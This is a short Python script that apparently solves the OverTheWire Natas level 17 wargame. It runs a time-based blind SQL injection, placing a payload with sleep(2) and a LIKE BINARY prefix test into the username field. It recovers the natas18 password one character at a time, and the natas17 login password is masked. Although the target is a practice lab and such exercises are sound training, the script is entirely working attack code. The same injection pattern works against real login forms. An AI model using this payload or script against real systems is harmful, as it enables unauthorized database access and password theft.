#!/usr/bin/python
import httplib2
import urllib
import time
  
h = httplib2.Http()
h.add_credentials('natas17', '********************************')
  
baseStr = ""
char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
index = 0
 
while index < len(char):
    query = urllib.urlencode(dict(username="natas18\" AND if(password LIKE BINARY \"" + baseStr + char[index] + "%\", sleep(2), 0);# "))
 
    StartTime = int(time.time())
    resp, content = h.request("http://natas17.natas.labs.overthewire.org/index.php?" + query, method="POST")
    EndTime = int(time.time())
    lapse = EndTime - StartTime
     
    if lapse >= 2:
        baseStr += char[index];
        print("New Password: " + baseStr)
        index = 0
        continue
    index += 1
